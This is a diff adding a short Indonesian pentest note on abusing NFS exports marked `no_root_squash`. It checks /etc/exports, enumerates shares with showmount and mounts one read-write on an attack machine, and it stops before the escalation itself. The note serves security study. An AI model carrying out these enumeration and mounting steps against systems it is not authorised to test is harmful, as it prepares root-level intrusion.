@@ -1,0 +1,21 @@
+`cat /etc/exports`
+
+jika terdapat `no_root_squash` menjadi critical dan attack vector.
+
+# enumerasi mountable share dari target
+```
+showmount -e IP
+...
+Export list for IP:
+/home/ubuntu/sharedfolder *
+/tmp                      *
+/home/backup              *
+```
+
+# mount `no_root_squash` share ke attack machine
+```
+mkdir /tmp/sharedfolder
+
+sudo mount -o rw IP:/home/sharedfolder /tmp/sharedfolder
+````
+
